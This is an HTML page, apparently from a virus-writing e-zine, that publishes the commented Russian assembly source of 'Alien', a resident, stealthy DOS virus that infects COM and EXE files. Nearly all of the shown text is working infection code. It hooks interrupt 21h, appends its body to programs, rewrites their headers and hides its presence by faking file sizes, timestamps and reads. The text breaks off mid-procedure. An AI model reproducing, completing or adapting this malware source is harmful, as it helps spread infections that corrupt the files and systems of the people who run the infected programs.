<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>ThE NeW OrDeR #2</title>
</head>

<body bgcolor="#000000" link="#0000FF" vlink="#000080"
bgproperties="fixed" topmargin="15" leftmargin="20" "
vlink="#000080">

<p align="center"><img src="../Images/viruz.gif" width="560"
height="100"></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../images/Rs.jpg" width="640" height="12"></strong></font></p>

<p align="center"><font color="#FF0000" size="5"><strong><img
src="../Images/fogskul.gif" alt="OneHalf  Virii" width="160"
height="100"></strong></font></p>

<p align="center"><font color="#FF0000" size="6"><strong>Alien</strong></font></p>

<p align="left"><font color="#00FF00" size="3"><strong>;
Версия KELA - 16-C-2.</strong></font></p>

<p align="left"><font color="#00FF00"><strong>;
*********************************************************<br>
; Данный виpус фоpмально является pезидентным
, файловым <br>
; виpусом поpажающим COM и EXE (без внутpенних
овеpлеев)<br>
; файлы путем дописывания в конец
файла. Виpус выполнен <br>
; по технологии ' стелс ' , стандаpтной
( пеpехват 21-го <br>
; пpеpывания ). <br>
; *********************************************************<br>
</strong></font></p>

<p align="left"><font color="#FFFFFF"><strong>Len EQU (offset
konec - offset Start_Virus) ; Длина вируса.<br>
Memory_V EQU Len/16+20 ; Обьем памяти,
неоходимый для зверя.<br>
<br>
<br>
.8086<br>
.model Tiny<br>
.code<br>
<br>
org 100h<br>
<br>
; Получить адрес старта в BP.<br>
<br>
Start_Virus:<br>
<br>
call start1<br>
start1: pop bp<br>
<br>
push ds<br>
<br>
; Вычислить истинный адрес старта с
учетом, что ( E8 00 00 - 3 байта ).<br>
<br>
sub bp,offset start1 - offset Start_Virus<br>
push bp<br>
push cs<br>
<br>
; Запомнить первоначальное
значение регистров.<br>
<br>
mov cs:word ptr [Anti+0+bp-100h],ax<br>
mov cs:word ptr [Anti+2+bp-100h],bx<br>
mov cs:word ptr [Anti+4+bp-100h],di<br>
mov cs:word ptr [Anti+6+bp-100h],si<br>
<br>
; Проверка на наличие зверька в
памяти<br>
<br>
push es<br>
push ds<br>
<br>
mov ax,0FFFFh<br>
int 21h<br>
push cs<br>
pop ds<br>
mov es,ax<br>
mov di,0100h<br>
mov si,bp<br>
mov cx,1000<br>
rep cmpsb<br>
<br>
pop ds<br>
pop es<br>
<br>
<br>
jnz install_to_memory<br>
jmp already<br>
<br>
install_to_memory:<br>
<br>
<br>
; Проинсталироваться в памяти<br>
<br>
alek:<br>
<br>
<br>
; Запросить требуемый обьем памяти.<br>
<br>
mov ah,048h<br>
mov bx,Memory_V<br>
int 21h<br>
<br>
; Если свободного блока нет, что
бывает чаще всего перейти на метку<br>
; install1<br>
<br>
jc install1<br>
dec ax<br>
mov es,ax<br>
jmp Save_to_memory<br>
<br>
<br>
install1:<br>
<br>
; Получить в ES адрес MCB программы.<br>
<br>
mov ax,ds<br>
dec ax<br>
mov es,ax<br>
<br>
; Если MCB программы последний , то
проинсталироваться.<br>
<br>
cmp byte ptr es:[00],05Ah<br>
je last_block<br>
jmp already<br>
<br>
last_block:<br>
<br>
; Сделать последний блок
предпоследним.<br>
<br>
mov byte ptr es:[00],04Dh<br>
mov ax,es:[03]<br>
sub ax,Memory_V<br>
jc already<br>
mov es:[03],ax<br>
<br>
; Уменьшить стек исполняемой
программы.<br>
<br>
sub word ptr es:[012h],Memory_V<br>
mov es,es:[012h]<br>
<br>
; Обозначить свой сегмент, как
последний.<br>
<br>
mov byte ptr es:[00],05Ah<br>
mov word ptr es:[03],Memory_V<br>
<br>
<br>
; Получить адрес корневого MCB.<br>
<br>
Save_to_memory:<br>
<br>
push es<br>
mov ax,05200h<br>
int 21h<br>
mov ax,es:[bx-2]<br>
push ax<br>
pop es<br>
mov ax,es:[01]<br>
pop es<br>
<br>
; Обозначить свой блок, как блок
принадлежащий системной области
MS-DOS.<br>
<br>
mov word ptr es:[01],ax<br>
<br>
push cs<br>
pop ds<br>
<br>
; Перенести свое тело в верхние
адреса памяти.<br>
<br>
push bp<br>
pop si<br>
mov di,0100h<br>
mov cx,Len/2+10<br>
rep movsw<br>
mov dx,offset start2<br>
push es<br>
push dx<br>
retf<br>
<br>
start2:<br>
<br>
<br>
; mov di,132<br>
; mov ax,es:[di]<br>
; mov cs:word ptr vector,ax<br>
; mov ax,es:[di+2]<br>
; mov cs:word ptr vector+2,ax<br>
; mov es:[di+2],09500h<br>
; mov es:[di],offset main<br>
<br>
push es<br>
<br>
mov ax,3521h<br>
int 21h<br>
mov cs:word ptr vector,bx<br>
mov cs:word ptr vector+2,es<br>
<br>
pop ds<br>
mov dx,offset main<br>
mov ax,2521h<br>
int 21h<br>
<br>
mov cs:byte ptr FlagC,0<br>
;<br>
;<br>
already:<br>
<br>
pop es<br>
pop bp<br>
pop dx<br>
<br>
; Проверить тип файла из которого
шла инсталяция.<br>
<br>
mov bh,es:byte ptr [FlagF+bp-100h]<br>
cmp bh,0<br>
<br>
; Если файл типа COM тогда перейти на
already1.<br>
<br>
push dx<br>
pop ds<br>
je already1<br>
<br>
<br>
; Восстановить прежнее значение
стека.<br>
<br>
cli<br>
add es:word ptr [OldStack+bp-100h],010h<br>
add es:word ptr [OldStack+bp-100h],dx<br>
mov ss,es:word ptr [OldStack+bp-100h]<br>
mov sp,es:word ptr [OldStack+bp-100h+2]<br>
sti<br>
<br>
; Расчитать точку входа в EXE файл,
для этого<br>
; к стартовому сегмнту DS прибавим 10h
и Head2 - поле CS (заголовка).<br>
<br>
add dx,010h<br>
add dx,es:word ptr [Head2+bp-100h]<br>
push dx<br>
mov dx,es:word ptr [Head1+bp-100h]<br>
push dx<br>
<br>
; Восстановить прежнее значение
регистров.<br>
<br>
Quit_Init:<br>
<br>
mov ax,es:word ptr [Anti+0+bp-100h]<br>
mov bx,es:word ptr [Anti+2+bp-100h]<br>
mov di,es:word ptr [Anti+4+bp-100h]<br>
mov si,es:word ptr [Anti+6+bp-100h]<br>
<br>
; Восстановить значение регистра ES ,
ES = DS.<br>
<br>
push ds<br>
pop es<br>
<br>
; Передать управление программе
носителю ( EXE &amp; COM - файл ).<br>
<br>
retf<br>
<br>
<br>
already1: ; Передача управления
программе - носителю ( COM - файл ).<br>
<br>
push dx<br>
mov di,0100h<br>
push di<br>
<br>
; Восстановить первые байты COM -
файла.<br>
<br>
mov ax,es:word ptr [CopyHead+0+bp-100h]<br>
mov es:[di],ax<br>
mov ax,es:word ptr [CopyHead+2+bp-100h]<br>
mov es:[di+2],ax<br>
<br>
jmp Quit_Init<br>
<br>
<br>
<br>
<br>
; *****************************************<br>
; * *<br>
; * РЕЗИДЕНТНАЯ ЧАСТЬ ВИРУСА. *<br>
; * *<br>
; *****************************************<br>
;<br>
<br>
main proc far<br>
<br>
pushf<br>
cmp ax,0FFFFh<br>
jne present<br>
<br>
; Если внутpенняя функция виpуса (
0FFFFh ) ,<br>
; то возвpатить в AX свой сегмент.<br>
<br>
mov ax,cs<br>
popf<br>
iret<br>
present:<br>
<br>
<br>
; Запомнить все регистры в стеке.<br>
<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
push si<br>
push di<br>
push bp<br>
push ds<br>
push es<br>
<br>
cli<br>
mov cs:word ptr function,ax<br>
cmp ah,043h ; Смена и получение
атрибутов.<br>
je COM1<br>
cmp ah,056h ; Переименование файла.<br>
je COM1<br>
cmp ah,04Fh ; Найти следующий
каталоговый вход.<br>
je COM9<br>
cmp ah,04Eh ; Найти каталоговый вход по
маске.<br>
je COM9<br>
cmp ah,011h ; Найти каталоговый вход по
маске через FCB.<br>
je COM9<br>
cmp ah,012h ; Найти следующий
каталоговый вход через FCB.<br>
je COM9<br>
cmp ah,03Fh ; Читать из файла.<br>
je COM3F<br>
cmp ah,03Ch ; Создать файл.<br>
je COM9<br>
cmp ah,03Dh ; Открыть файл.<br>
je COM1<br>
cmp ah,040h ; Писать в файл.<br>
je COM7<br>
cmp ah,03Eh ; Закрытие файла.<br>
je COM8<br>
cmp ax,04B00h ; Запуск программы.<br>
je COM<br>
cmp ax,05700h ; Получить вpемя и дату
последней модификации.<br>
je COM9<br>
<br>
eee_21:<br>
<br>
pop es<br>
pop ds<br>
pop bp<br>
pop di<br>
pop si<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
<br>
cmp ax,4202h ; Переместить указатель на
конец файла.<br>
je COM6<br>
popf<br>
<br>
Exit_to_21h:<br>
<br>
; Длинный переход на обработчик 21-го
прерывания (DOS).<br>
<br>
jmp cs:dword ptr [vector]<br>
<br>
COM1: jmp COM2<br>
<br>
COM7: jmp TRUNCATE_Virus<br>
<br>
COM9: jmp exit<br>
<br>
COM6: jmp Ls<br>
<br>
COM8:<br>
<br>
; Если было захвачено имя файла при
создании и его хендлер<br>
; то перейти на COM4.<br>
<br>
cmp cs:byte ptr FlagC,2<br>
je COM4<br>
jmp eee_21<br>
COM4:<br>
<br>
; Если хендлер , закрываемого файла
совпадает с захваченным<br>
; то перейти на COM5.<br>
<br>
cmp cs:word ptr Hendler,bx<br>
je COM5<br>
jmp eee_21<br>
COM5: mov cs:byte ptr FlagC,1<br>
<br>
jmp exit<br>
<br>
COM3F: call Test_File_on_Virus<br>
jc eee_21<br>
jmp exit<br>
<br>
<br>
<br>
; Обpаботка файла с пpовеpкой
pасшиpения.<br>
<br>
COM2:<br>
call Test_Name_Com&amp;Exe<br>
jnc COM<br>
jmp eee_21<br>
<br>
<br>
COM:<br>
<br>
call Infected_File<br>
jmp eee_21<br>
<br>
<br>
Ls:<br>
<br>
; Проверить, является ли данный файл
пораженным.<br>
<br>
call Test_File_on_Virus<br>
jc exit4202<br>
<br>
mov cs:word ptr data_48,dx<br>
mov cs:word ptr data_47,cx<br>
xor cx,cx<br>
xor dx,dx<br>
call intr21<br>
sub ax,Len<br>
sbb dx,0<br>
mov cx,ax<br>
xchg cx,dx<br>
add dx,cs:data_48<br>
adc cx,cs:data_47<br>
mov ax,4200h<br>
<br>
exit4202:<br>
<br>
popf<br>
jmp Exit_to_21h<br>
<br>
<br>
TRUNCATE_Virus:<br>
<br>
cmp bx,4<br>
jb exit<br>
call Test_File_on_Virus<br>
jc exit<br>
<br>
; Прочитать текущую позицию
указателя в файле.<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax,4201h<br>
call intr21<br>
<br>
mov cs:word ptr data_41,dx<br>
mov cs:word ptr data_40,ax<br>
<br>
; Установить указатель на конец
файла.<br>
<br>
call Lseek_End<br>
<br>
; Вычесть из длины файла длину
вируса.<br>
<br>
sub ax,Len<br>
sbb dx,0<br>
<br>
; Сохранить подставляемую длину
(DX:AX) в переменной ...<br>
<br>
mov cs:word ptr data_42,ax<br>
mov cs:word ptr data_43,dx<br>
<br>
; Установить указатель<br>
<br>
call Set_Seek_to_Old_Header<br>
<br>
push cs<br>
pop ds<br>
<br>
; Прочитать истинный заголовок в
теле вируса.<br>
<br>
call Read_Header<br>
<br>
; Установить указатель на начало
файла.<br>
<br>
call Lseek_Begin<br>
<br>
; Записать истинный заголовок в
файл.<br>
<br>
call Write_Header<br>
<br>
mov dx,cs:word ptr data_42<br>
mov cx,cs:word ptr data_43<br>
mov ax,4200h<br>
call intr21<br>
<br>
; Выкусить вирус из файла.<br>
<br>
call Truncate<br>
<br>
; Установить старую позицию
указателя файла (SEEK).<br>
<br>
call Set_Old_Seek<br>
<br>
exit:<br>
<br>
; Восстановить старое значение
регистров из стека.<br>
<br>
pop es<br>
pop ds<br>
pop bp<br>
pop di<br>
pop si<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
popf<br>
<br>
call intr21<br>
cli<br>
<br>
; Механизм для подстановки регистра
флагов, возвращаемого DOS.<br>
<br>
pop cs:word ptr dermo<br>
pop cs:word ptr dermo1<br>
pop cs:word ptr dermo2<br>
pushf<br>
push cs:word ptr dermo1<br>
push cs:word ptr dermo<br>
<br>
; Запомнить регистры.<br>
<br>
push ax<br>
push bx<br>
push es<br>
<br>
<br>
; Механизм невидимости вируса (
подстановка настоящей длины файла
).<br>
<br>
mov bx,ax<br>
mov ax,cs:word ptr function<br>
cmp ah,04fh<br>
je all_s<br>
cmp ah,04eh<br>
je all_s<br>
cmp ah,012h<br>
je all_s1<br>
cmp ah,011h<br>
je all_s1<br>
cmp ah,03Ch ; Создание файла.<br>
je all_s5<br>
cmp ah,03Fh ; Чтение из файла.<br>
jne exit_check_3F<br>
jmp all_s2<br>
<br>
exit_check_3F:<br>
<br>
cmp ah,03Eh ; Закрытие файла.<br>
jne exit_check_3E<br>
jmp all_s6<br>
<br>
exit_check_3E:<br>
<br>
cmp ax,05700h<br>
jne exit_check_57<br>
jmp Stealth_Time<br>
<br>
exit_check_57:<br>
<br>
<br>
jmp exit_all<br>
<br>
all_s5:<br>
<br>
; Перехватить имя созданного файла
и его хендлер<br>
; и установить флаг FlagC в 2 (захват в
File1 и Hendler)<br>
<br>
mov cs:word ptr Hendler,bx<br>
mov cs:word ptr File1+2,ds<br>
mov cs:word ptr File1,dx<br>
mov cs:byte ptr FlagC,2<br>
<br>
jmp exit_all<br>
<br>
<br>
; Обработать , если вызывалась
функция 4E или 4F.<br>
<br>
all_s:<br>
mov ah,02fh<br>
call intr21<br>
mov ax,es:[bx+016h]<br>
and ax,00011111b<br>
cmp ax,00011111b<br>
jne exit_all_s<br>
<br>
; Вычесть из длины файла свою длину (
Len ).<br>
<br>
sub es:word ptr [bx+01ah],Len<br>
sbb es:word ptr [bx+01ch],0<br>
<br>
; Замаскировать время последней
модификации.<br>
<br>
and es:byte ptr [bx+016h],11100000b<br>
<br>
exit_all_s:<br>
<br>
jmp exit_all<br>
<br>
; Обработать , если вызывалась
функция 11 или 12.<br>
<br>
all_s1:<br>
mov ah,02fh<br>
call intr21<br>
<br>
; Если FCB расширенный, тогда к
смещению указателя на FCB добавить 8.<br>
<br>
cmp word ptr es:[bx],0FFh<br>
jne Not_Extend_FCB<br>
add bx,8<br>
<br>
Not_Extend_FCB:<br>
<br>
mov ax,es:[bx+016h]<br>
and ax,00011111b<br>
cmp ax,00011111b<br>
jne exit_all_s1<br>
<br>
; Вычесть из длины файла свою длину (
Len ).<br>
<br>
sub es:word ptr [bx+01Ch],Len<br>
sbb es:word ptr [bx+01Eh],0<br>
<br>
; Замаскировать время последней
модификации.<br>
<br>
and es:byte ptr [bx+016h],11100000b<br>
<br>
exit_all_s1:<br>
<br>
jmp exit_all<br>
<br>
loc_91:<br>
jmp loc_95<br>
<br>
<br>
; Подстановка тела заpаженного
файла в пеpвоначальном виде в
памяти.<br>
<br>
all_s2:<br>
pop es<br>
pop bx<br>
pop ax<br>
<br>
push ax<br>
push cx<br>
push dx<br>
push di<br>
push si<br>
push ds<br>
push es<br>
<br>
<br>
; Сохранить указатель DS:DX на область
прочитанных из файла<br>
; данных в переменных ...<br>
<br>
mov cs:word ptr data_45,dx<br>
mov cs:word ptr data_46,ds<br>
<br>
; Сохранить количество прочитанных
байт (AX) в переменной ...<br>
<br>
mov cs:word ptr Count_Byte,ax<br>
<br>
; Прочитать текущую позицию
указателя в файле.<br>
<br>
xor cx,cx<br>
xor dx,dx<br>
mov ax,4201h<br>
call intr21<br>
jc loc_91<br>
<br>
; Отнять от текущей позиции
количество прочитанных байт.<br>
<br>
sub ax,cs:word ptr Count_Byte<br>
sbb dx,0<br>
<br>
; Сохранить значение указателя
файла до чтения из него<br>
; данного блока (DX:AX) в переменной ...<br>
<br>
mov cs:word ptr data_41,dx<br>
mov cs:word ptr data_40,ax<br>
<br>
; Установить указатель на конец
файла.<br>
<br>
call Lseek_End<br>
<br>
; Вычесть из длины файла длину
вируса.<br>
<br>
sub ax,Len<br>
sbb dx,0<br>
<br>
; Сохранить подставляемую длину
(DX:AX) в переменной ...<br>
<br>
mov cs:word ptr data_42,ax<br>
mov cs:word ptr data_43,dx<br>
<br>
; Если информация начинала
считываться в пределах<br>
; первых 64K то продолжить, иначе
перейти на loc_93.<br>
<br>
cmp cs:word ptr data_41,0<br>
jne loc_93<br>
<br>
; Если считана информация из
заголовка файла то перейти на loc_97.<br>
<br>
cmp cs:word ptr data_40,18h<br>
jb loc_97<br>
loc_93:<br>
mov cx,cs:word ptr data_41<br>
mov dx,cs:word ptr data_40<br>
add dx,cs:word ptr Count_Byte<br>
adc cx,0<br>
cmp cx,cs:word ptr data_43<br>
jb loc_94<br>
ja loc_96<br>
cmp dx,cs:word ptr data_42<br>
ja loc_96<br>
loc_94:<br>
mov cx,cs:word ptr data_41<br>
mov dx,cs:word ptr data_40<br>
add dx,cs:word ptr Count_Byte<br>
adc cx,0<br>
mov ax,4200h<br>
call intr21<br>
loc_95:<br>
<br>
; Восстановить регистры из стека.<br>
<br>
pop es<br>
pop ds<br>
pop si<br>
pop di<br>
pop dx<br>
pop cx<br>
pop ax<br>
iret<br>
loc_96:<br>
jmp loc_101<br>
<br>
loc_97:<br>
<br>
; ПОДСТАНОВКА ЗАГОЛОВКА ФАЙЛА В
ПАМЯТИ.<br>
<br>
<br>
; Установить указатель на область,
где располагается истинный
заголовок.<br>
<br>
cmp cs:word ptr Count_Byte,0<br>
je loc_93<br>
<br>
call Set_Seek_to_Old_Header<br>
<br>
; Прочитать истинный заголовок
файла.<br>
<br>
push cs<br>
pop ds<br>
<br>
call Read_Header<br>
jc loc_93<br>
<br>
; Расчитать количество байт, котоpые
тpебуется подставить.<br>
<br>
cmp ax,18h<br>
jne loc_93<br>
mov cx,cs:word ptr data_40<br>
neg cx<br>
add cx,18h<br>
cmp cx,cs:word ptr Count_Byte<br>
jb loc_98<br>
mov cx,cs:word ptr Count_Byte<br>
<br>
loc_98:<br>
<br>
; Подставить истинный заголовок в
памяти.<br>
<br>
mov si,offset tri<br>
add si,cs:word ptr data_40<br>
mov di,cs:word ptr data_45<br>
mov es,cs:word ptr data_46<br>
cld<br>
cmp cx,0<br>
je loc_99<br>
rep movsb<br>
loc_99:<br>
jmp loc_93<br>
<br>
<br>
loc_101:<br>
mov cx,cs:word ptr data_41<br>
cmp cx,cs:word ptr data_43<br>
ja loc_102<br>
jc loc_104<br>
mov cx,cs:word ptr data_40<br>
cmp cx,cs:word ptr data_42<br>
jb loc_104<br>
loc_102:<br>
<br>
call Set_Old_Seek<br>
xor ax,ax<br>
<br>
loc_103:<br>
pop es<br>
pop ds<br>
pop si<br>
pop di<br>
pop dx<br>
pop cx<br>
pop cs:word ptr dermo<br>
iret<br>
loc_104:<br>
mov cx,cs:word ptr data_43<br>
mov dx,cs:word ptr data_42<br>
mov ax,4200h<br>
call intr21<br>
sub ax,cs:word ptr data_40<br>
jmp loc_103<br>
<br>
<br>
all_s6:<br>
<br>
; Проверить совпадал ли хендлер
перед закрытием<br>
; если не совпадал , то перейти на
exit_all.<br>
<br>
cmp cs:byte ptr FlagC,1<br>
jne exit_all<br>
<br>
pop es<br>
pop bx<br>
pop ax<br>
<br>
pushf<br>
push ax<br>
push bx<br>
push cx<br>
push dx<br>
push si<br>
push di<br>
push bp<br>
push ds<br>
push es<br>
<br>
; Загрузить в DS:DX указатель на
сохраненное при открытии имя файла<br>
; и перейти на обработку.<br>
<br>
mov ds,cs:word ptr File1+2<br>
mov dx,cs:word ptr File1<br>
mov cs:byte ptr FlagC,0<br>
<br>
call Test_Name_Com&amp;Exe<br>
jnc KU_KU<br>
jmp mud<br>
KU_KU:<br>
call Infected_File<br>
<br>
<br>
mud:<br>
<br>
pop es<br>
pop ds<br>
pop bp<br>
pop di<br>
pop si<br>
pop dx<br>
pop cx<br>
pop bx<br>
pop ax<br>
popf<br>
iret<br>
<br>
exit_all:<br>
<br>
pop es<br>
pop bx<br>
pop ax<br>
<br>
iret<br>
<br>
Stealth_Time:<br>
<br>
; Замаскировать время последней
модификации файла ( 62 секунды ).<br>
<br>
and cl,11100000b<br>
<br>
jmp exit_all<br>
<br>
<br>
main endp<br>
<br>
<br>
;<br>
; ОБЛАСТЬ ФУНКЦИЙ ВИРУСА.<br>
;<br>
; Функция обработки 21-го прерывания.<br>
<br>
intr21 proc near<br>
<br>
pushf<br>
db 09Ah<br>
vector dd ?<br>
ret<br>
<br>
intr21 endp<br>
<br>
<br>
; ********************************************************<br>
; * *<br>
; * Функция полной обpаботки файла. *<br>
; * *<br>
; ********************************************************<br>
<br>
<br>
Infected_File proc near<br>
<br>
call Effect<br>
<br>
; Взять на себя вектор обработчика
критических ошибок ( int 24 ).<br>
<br>
call Set_Vector_24<br>
<br>
; Прочитать атрибуты файла.<br>
<br>
mov ax,04300h<br>
call intr21<br>
mov cs:word ptr attr_b,cx<br>
jnc no_err<br>
jmp exit1<br>
<br>
; Снять атрибуты файла.<br>
<br>
no_err:<br>
mov ax,04301h<br>
xor cx,cx<br>
call intr21<br>
jnc no_no_err<br>
jmp exit1<br>
<br>
no_no_err:<br>
<br>
; Сохранить указатель на имя файла в
стеке.<br>
<br>
push ds<br>
push dx<br>
<br>
; Открыть файл для записи.<br>
<br>
mov ax,03d02h<br>
call intr21<br>
mov bx,ax<br>
<br>
; Сохранить время и дату последней
модификации файла.<br>
<br>
call Keep_Date_Time<br>
<br>
; Установить указатель на конец
файла.<br>
<br>
call Lseek_End<br>
<br>
; Сохранить длину файла в
переменной EXElen.<br>
<br>
mov cs:word ptr EXElen,ax<br>
mov cs:word ptr EXElen+2,dx<br>
<br>
; Установить указатель на последние
4 байта.<br>
<br>
mov cx,dx<br>
mov dx,ax<br>
sub dx,4<br>
sbb cx,0<br>
mov ax,04200h<br>
call intr21<br>
<br>
; Считать последние 4 байта.<br>
<br>
push cs<br>
pop ds<br>
mov ah,3fh<br>
mov dx,offset ident<br>
mov cx,4<br>
call intr21<br>
<br>
; Проверить , нуждается ли файл в
обработке.<br>
<br>
mov ax,'~~'<br>
cmp ax,cs:word ptr ident<br>
jne infect1<br>
mov ax,'~~'<br>
cmp ax,cs:word ptr ident+2<br>
jne infect1<br>
jmp meme<br>
<br>
infect1:<br>
<br>
; Установить указатель на начало
файла.<br>
<br>
call Lseek_Begin<br>
<br>
; Прочитать первые 18h байт файла для
опознания типа.<br>
<br>
call Read_Header<br>
<br>
push cs<br>
pop es<br>
mov si,offset tri<br>
mov di,offset CopyHead<br>
mov cx,018h<br>
rep movsb<br>
<br>
; Если файл типа EXE перейти на метку
EXE.<br>
<br>
mov ax,cs:word ptr tri<br>
cmp ax,'ZM'<br>
jne not_exe<br>
jmp EXE<br>
not_exe:<br>
cmp ax,'MZ'<br>
jne not_exe1<br>
<br>
; Файл типа EXE.<br>
<br>
EXE:<br>
call Virus_on_Exe_File<br>
jnc meme<br>
jmp restore_time<br>
<br>
<br>
; Файл типа COM.<br>
<br>
not_exe1:<br>
<br>
call Virus_on_Com_File<br>
jnc meme<br>
jmp restore_time<br>
<br>
<br>
meme: ; Метка окончания обработки
файла.<br>
<br>
; Восстановить время и дату
последней модификации файла.<br>
<br>
mov ax,05701h<br>
mov cx,cs:word ptr time_t<br>
or cl,011111b<br>
mov dx,cs:word ptr date_d<br>
call intr21<br>
<br>
; Закрыть файл.<br>
<br>
close_file:<br>
<br>
mov ah,3eh<br>
call intr21<br>
<br>
; Восстановить из стека указатель
на имя файла.<br>
<br>
pop dx<br>
pop ds<br>
<br>
; Восстановить прежние атрибуты
файла.<br>
<br>
mov ax,04301h<br>
mov cx,cs:word ptr attr_b<br>
call intr21<br>
<br>
exit1:<br>
<br>
; Восстановить прежний обработчик
критических ошибок.<br>
<br>
call Restore_Vector_24<br>
<br>
ret<br>
<br>
restore_time:<br>
<br>
mov ax,05701h<br>
mov cx,cs:word ptr time_t<br>
mov dx,cs:word ptr date_d<br>
call intr21<br>
jmp close_file<br>
<br>
<br>
Infected_File endp<br>
<br>
; ************** Функция обработки EXE -
файла **************<br>
<br>
Virus_on_Exe_File proc near<br>
<br>
clc<br>
<br>
; Установить FlagF в 1 ( это означает,
что тело носитель EXE - файл).<br>
<br>
mov cs:byte ptr FlagF,1<br>
<br>
; Установить указатель на конец
файла (Длина в DX:AX).<br>
<br>
call Lseek_End<br>
<br>
; Расчитать новый стартовый адрес EXE
- файла<br>
; с помощью формул CS = EXElen/16-HdrSize , IP =
EXElen%16,<br>
; где EXElen - длина EXE - файла,<br>
; HdrSize - размер заголовка в 16 байтных
параграфах.<br>
<br>
mov cx,16<br>
div cx<br>
sub ax,cs:word ptr HdrSize<br>
<br>
; Сохранить новое значение CS:IP в
переменной Header.<br>
<br>
mov cs:word ptr Header,dx<br>
mov cs:word ptr Header+2,ax<br>
<br>
; Проверить , имееет ли файл
внутренние оверлеи :<br>
; EXElen = (PageP-1)*512+PageL , если это условие
выполняется<br>
; файл внутренних оверлеев не имеет.<br>
; PageP - количество 512 байтных страниц
, загружаемых в память.<br>
; PageL - количество байт в последней
странице.<br>
<br>
mov ax,cs:word ptr PageP<br>
dec ax<br>
mov cx,512<br>
mul cx<br>
add ax,cs:word ptr PageL<br>
adc dx,0<br>
cmp dx,cs:word ptr EXElen+2<br>
je infect<br>
stc<br>
ret<br>
<br>
infect:<br>
<br>
cmp ax,cs:word ptr EXElen<br>
je infect3<br>
stc<br>
ret<br>
<br>
infect3:<br>
<br>
; Расчитать новое значение
переменных PageP и PageL<br>
; с помощью формул PageP = (EXElen + Len)/512+1 ,
PageL = (EXElen + Len)%512,<br>
; Len - длина вируса.<br>
<br>
mov dx,cs:word ptr EXElen+2<br>
mov ax,cs:word ptr EXElen<br>
add ax,Len<br>
adc dx,0<br>
<br>
mov cx,512<br>
div cx<br>
inc ax<br>
mov cs:word ptr PageP,ax<br>
mov cs:word ptr PageL,dx<br>
<br>
; Расчитать новое значение
указателя стека.<br>
<br>
mov ax,cs:word ptr Header+2<br>
mov dx,cs:word ptr Header<br>
add dx,Len+50<br>
<br>
; Сохранить новое значение
указателя стека в переменной SStack.<br>
<br>
mov cs:word ptr SStack,ax<br>
mov cs:word ptr SStack+2,dx<br>
<br>
; Заразить EXE - файл.<br>
<br>
call Virus_to_File<br>
jnc OK_EXE<br>
stc<br>
ret<br>
<br>
OK_EXE:<br>
<br>
ret<br>
<br>
Virus_on_Exe_File endp<br>
<br>
; ************** Функция обработки COM -
файла **************<br>
<br>
Virus_on_Com_File proc near<br>
<br>
clc<br>
<br>
; Установить флаг типа файла в 0 ( тип
- COM ).<br>
<br>
mov cs:byte ptr FlagF,0<br>
<br>
; Получить длину COM - файла.<br>
<br>
call Lseek_End<br>
<br>
; Не трогать COM - файл меньше 100 байт.<br>
<br>
cmp ax,0100<br>
ja Not_Small<br>
stc<br>
ret<br>
<br>
Not_Small:<br>
<br>
; Не трогать COM - файл более 65530-Len
байт.<br>
<br>
cmp ax,65530-Len<br>
jb Not_Big<br>
stc<br>
ret<br>
<br>
Not_Big:<br>
<br>
sub ax,3<br>
mov cs:byte ptr tri,0E9h<br>
mov cs:word ptr [tri+1],ax<br>
<br>
; Заразить COM - файл.<br>
<br>
call Virus_to_File<br>
jnc OK_COM<br>
stc<br>
ret<br>
<br>
OK_COM:<br>
<br>
ret<br>
<br>
Virus_on_Com_File endp<br>
<br>
; Функция записи виpуса в файл.<br>
; При ошибке устанавливает флаг CF.<br>
<br>
Virus_to_File proc near<br>
<br>
clc<br>
<br>
; Приписать свое тело к файлу.<br>
<br>
call Connect<br>
<br>
; Проверить, хватило ли места для
приписывания вируса.<br>
<br>
cmp ax,cx<br>
je Yes_Space_to_Virus<br>
<br>
; Если места не хватило, то
выкуситься.<br>
<br>
mov cx,cs:word ptr EXElen+2<br>
mov dx,cs:word ptr EXElen<br>
mov ax,04200h<br>
call intr21<br>
call Truncate<br>
stc<br>
ret<br>
<br>
Yes_Space_to_Virus:<br>
<br>
; Установить указатель на начало
файла.<br>
<br>
call Lseek_Begin<br>
<br>
; Записать исправленный заголовок
файла.<br>
<br>
call Write_Header<br>
ret<br>
<br>
Virus_to_File endp<br>
<br>
; Функция пристыковки тела вируса к
файлу.<br>
<br>
Connect proc near<br>
<br>
mov dx,offset Start_Virus<br>
mov cx,Len<br>
mov ah,040h<br>
call intr21<br>
ret<br>
<br>
Connect endp<br>
<br>
; Функция установки файлового
указателя на конец файла.<br>
<br>
Lseek_End proc near<br>
<br>
mov ax,04202h<br>
xor cx,cx<br>
xor dx,dx<br>
call intr21<br>
ret<br>
<br>
Lseek_End endp<br>
<br>
; Функция установки файлового
указателя на начало файла.<br>
<br>
Lseek_Begin proc near<br>
<br>
mov ax,04200h<br>
xor cx,cx<br>
xor dx,dx<br>
call intr21<br>
ret<br>
<br>
Lseek_Begin endp<br>
<br>
; Функция получения и сохранения
времени и даты последней<br>
; модификации файла.<br>
; Время сохраняется в переменной
time_t.<br>
; Дата сохраняется в переменной date_d.<br>
<br>
Keep_Date_Time proc near<br>
<br>
mov ax,05700h<br>
call intr21<br>
mov cs:word ptr time_t,cx<br>
mov cs:word ptr date_d,dx<br>
ret<br>
<br>
Keep_Date_Time endp<br>
<br>
; Функция срезания конца файла.<br>
<br>
Truncate proc near<br>
<br>
mov ah,040h<br>
mov cx,0<br>
call intr21<br>
ret<br>
<br>
Truncate endp<br>
<br>
<br>
; Функция записи исправленного
заголовка в файл.<br>
<br>
Write_Header proc near<br>
<br>
mov ah,040h<br>
mov cx,18h<br>
mov dx,offset tri<br>
call intr21<br>
ret<br>
<br>
Write_Header endp<br>
<br>
; Функция чтения заголовка файла.<br>
<br>
Read_Header proc near<br>
<br>
mov ah,3fh<br>
mov dx,offset tri<br>
mov cx,18h<br>
call intr21<br>
ret<br>
<br>
Read_Header endp<br>
<br>
<br>
; Функция установки текущей позиции
в файле (SEEK) из сохраненной<br>
; переменной ...<br>
<br>
Set_Old_Seek proc near<br>
<br>
mov cx,cs:word ptr data_41<br>
mov dx,cs:word ptr data_40<br>
mov ax,4200h<br>
